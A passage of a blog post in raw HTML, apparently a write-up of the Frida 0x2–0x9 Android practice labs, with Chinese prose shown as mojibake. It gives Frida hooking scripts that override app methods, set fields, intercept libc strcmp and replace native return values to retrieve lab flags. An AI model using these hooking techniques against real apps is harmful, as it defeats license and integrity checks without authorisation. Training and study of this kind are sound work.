class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503282033882.png" alt="image-20250327213059058" style="zoom:50%;" /><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><p>ç›´æ¥ä½¿ç”¨pythonè„šæœ¬ attack pidå¯¹å…¶è¿›è¡Œhookæ˜¯è¡Œä¸é€šï¼Œåœ¨è¿è¡Œçš„æ—¶å€™ä¼šè°ƒç”¨å®ŒonCreateæ–¹æ³•ï¼Œæ²¡æœ‰å…¶ä»–çš„æ–¹æ³•è°ƒç”¨èƒ½è®©æˆ‘ä»¬è¿›è¡Œhookï¼Œå› æ­¤å¾—åœ¨å¯åŠ¨çš„ç¬é—´å°±å¾—ç›´æ¥è¿›è¡Œhookçš„æ³¨å…¥</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onCreate</span>(bundle);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&quot;è§¦å‘get_flagæ–¹æ³•...&quot;</span>);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="keyword">this</span>.<span class="built_in">get_flag</span>(<span class="number">4919</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ä¿å­˜ä¸ºhook.js</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.ad2001.frida0x2 -l hook.js</span><br></pre></td></tr></table></figure><p>å°±èƒ½åœ¨æ¨¡æ‹Ÿå™¨ä¸­çœ‹åˆ°flagå•¦ï¼Œè™½ç„¶è¿˜æœ‰æŠ¥errorä¸ºundefineï¼ˆä½†é—®é¢˜åº”è¯¥ä¸å¤§ï¼Ÿ</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><p>hookæ‰Checkeré™æ€å˜é‡codeçš„å€¼ï¼Œç„¶åå†é‡æ–°è°ƒç”¨onClick</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;com.ad2001.frida0x3.MainActivity$1&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        var checker = Java.use(&quot;com.ad2001.frida0x3.Checker&quot;);</span></span><br><span class="line"><span class="string">        checker.code.value=512;</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.attach(<span class="number">2977</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h3><p>åœ¨å…¶ä»–æ–¹æ³•é‡Œæœ‰ä¸€ä¸ªget_flagå‡½æ•°ï¼ŒåŒ0x2ç±»ä¼¼ï¼Œhookæ‰onCreateå³å¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x4.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ­£ç¡®Hook onCreateæ–¹æ³•</span></span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onCreate</span>(bundle);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&quot;è§¦å‘get_flagæ–¹æ³•...&quot;</span>);</span><br><span class="line">        var checker = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>)</span><br><span class="line">        var check = checker.$<span class="built_in">new</span>();</span><br><span class="line">        console.<span class="built_in">log</span>(check.<span class="built_in">get_flag</span>(<span class="number">1337</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè®°ä½get_flagä¸æ˜¯é™æ€æ–¹æ³•ï¼Œéœ€è¦å…ˆ<strong>å®ä¾‹åŒ–</strong>ç„¶åæ‰èƒ½è°ƒç”¨</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503282033884.png" alt="image-20250327233612795" style="zoom: 50%;" /><h3 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h3><p>åŒä¸Šï¼Œç›´æ¥hook onCreateè°ƒflagæ–¹æ³•å³å¯</p><h3 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h3><p>éœ€è¦åœ¨ä¼ å‚çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå®ä¾‹åŒ–çš„checkerï¼Œå¹¶å¯¹å…¶ä¸­çš„å˜é‡è¿›è¡Œèµ‹å€¼ï¼Œhookæ‰onCreate</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x6.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ­£ç¡®Hook onCreateæ–¹æ³•</span></span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onCreate</span>(bundle);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&quot;è§¦å‘get_flagæ–¹æ³•...&quot;</span>);</span><br><span class="line">        var checker = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>)</span><br><span class="line">        var check = checker.$<span class="built_in">new</span>();</span><br><span class="line">        check.num1.value=<span class="number">1234</span>;</span><br><span class="line">        check.num2.value=<span class="number">4321</span>;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">get_flag</span>(check);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x7.MainActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    MainActivity.flag.implementation  = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        var check=Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">        var check_instance=check.$<span class="built_in">new</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        check_instance.num1.value=<span class="number">1000</span>;</span><br><span class="line">        check_instance.num2.value=<span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">flag</span>(check_instance);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¦æ±‚åœ¨checkerå­˜åœ¨å˜é‡çš„æ—¶å€™ï¼Œå®ä¾‹åŒ–è¦è¿›è¡Œå‚æ•°çš„æŒ‡å®šï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><h3 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h3><p>ä¸€äº›fridaç”¨æ³•</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">enumerateExports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x706e3cef88c0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x706e3cef8aa0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_ZN7_JNIEnv17GetStringUTFCharsEP8_jstringPh&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x706e3cef8ae0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_ZN7_JNIEnv21ReleaseStringUTFCharsEP8_jstringPKc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">enumerateExports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)[<span class="number">0</span>].address</span><br><span class="line"><span class="string">&quot;0x706e3cef88c0&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8]-&gt; Module.<span class="built_in">getExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="string">&quot;0x706e3cef88c0&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line"><span class="string">&quot;0x706e3cef88c0&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">getBaseAddress</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line"><span class="string">&quot;0x706e3cef8000&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">enumerateImports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74e9920&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__cxa_finalize&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9d90&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74e9660&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__cxa_atexit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9d98&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74e5300&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__register_atfork&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9da0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74a7970&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__strlen_chk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9db0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f7475040&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;strcmp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9db8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070fb675140&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/system/lib64/liblog.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__android_log_print&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9dc0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74906b0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__stack_chk_fail&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9dd0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™ä¸ªlabä½¿ç”¨çš„nativeå±‚é‡Œçš„å‡½æ•°ï¼Œå› æ­¤æŒ‰ç…§ä¹‹å‰çš„æ–¹å¼è¿›è¡Œhookå°±ä¼šå‡ºç°é—®é¢˜ï¼Œå› æ­¤å¼•å…¥ä¸€ä¸ªapi</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Interceptor.<span class="built_in">attach</span>(targetAddress, &#123;</span><br><span class="line">    onEnter: <span class="built_in">function</span> (args) &#123;</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&#x27;Entering &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log arguments if needed</span></span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: <span class="built_in">function</span> (retval) &#123;</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&#x27;Leaving &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log return value if needed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li><code>Interceptor.attach</code>ï¼šä¸ºæŒ‡å®šçš„å‡½æ•°åœ°å€é™„åŠ ä¸€ä¸ªå›è°ƒã€‚<code>targetAddress</code> åº”è¯¥æ˜¯æˆ‘ä»¬æƒ³è¦ hook çš„åŸç”Ÿå‡½æ•°çš„åœ°å€ã€‚</li><li><code>onEnter</code>ï¼šå½“ è¢«hookçš„å‡½æ•° è¿›å…¥æ—¶è°ƒç”¨è¯¥å›è°ƒã€‚å®ƒæä¾›å¯¹å‡½æ•°å‚æ•° ï¼ˆ<code>argsï¼‰</code> çš„è®¿é—® ã€‚</li><li><code>onLeave</code>ï¼šå½“ è¢«hookçš„å‡½æ•° å³å°†é€€å‡ºæ—¶è°ƒç”¨è¯¥å›è°ƒã€‚å®ƒæä¾›å¯¹è¿”å›å€¼ ï¼ˆ<code>retval</code>ï¼‰ çš„è®¿é—®ã€‚</li></ul><p>è€Œä¹‹å‰æåˆ°çš„éƒ½æ˜¯èƒ½å¤Ÿè·å¾—addrçš„apiï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘hookæ‰strcmpæ¥è·å–ä»–çš„å‚æ•°ï¼Œå› ä¸ºåœ¨libfrida0x8.soä¸­strcmpçš„å‚æ•°æœ‰åŒ…æ‹¬flagçš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;com.ad2001.frida0x8.MainActivity$1&quot;);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        var strcmp_addr=Module.findExportByName(&quot;libc.so&quot;,&quot;strcmp&quot;);</span></span><br><span class="line"><span class="string">        Interceptor.attach(strcmp_addr, &#123;</span></span><br><span class="line"><span class="string">        onEnter: function (args) &#123;</span></span><br><span class="line"><span class="string">        var string=Memory.readUtf8String(args[0])</span></span><br><span class="line"><span class="string">            if(string==&quot;abcd&quot;)</span></span><br><span class="line"><span class="string">                console.log(Memory.readUtf8String(args[1]));</span></span><br><span class="line"><span class="string">            // Modify or log arguments if needed</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function (retval) &#123;</span></span><br><span class="line"><span class="string">            // Modify or log return value if needed</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    this.onClick(v);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.attach(<span class="number">6861</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>è®°å¾—åœ¨hookä¹‹åé‡æ–°è°ƒç”¨onClickï¼ˆå¥½ç©ï¼</p><h3 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function() &#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.ad2001.a0x9.MainActivity$<span class="number">1</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v) &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;</span>[*] onClick è¢«è°ƒç”¨<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        var check_flag = Module.findExportByName(&quot;</span>liba0x9.so<span class="string">&quot;, &quot;</span>Java_com_ad2001_a0x9_MainActivity_check_1flag<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        Interceptor.attach(check_flag, &#123;</span></span><br><span class="line"><span class="string">            onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">                console.log(&quot;</span>[*] check_flag è¢«è°ƒç”¨<span class="string">&quot;);</span></span><br><span class="line"><span class="string">            &#125;,</span></span><br><span class="line"><span class="string">            onLeave: function(retval) &#123;</span></span><br><span class="line"><span class="string">                retval.replace(1337); // ä¿®æ”¹è¿”å›å€¼ä¸º 1337</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">7244</span>)</span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)</span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><p>æ›¿æ¢è¿”å›å€¼å³å¯</p><h3 id="0xa"><a href="#0xa" class="headerlink" 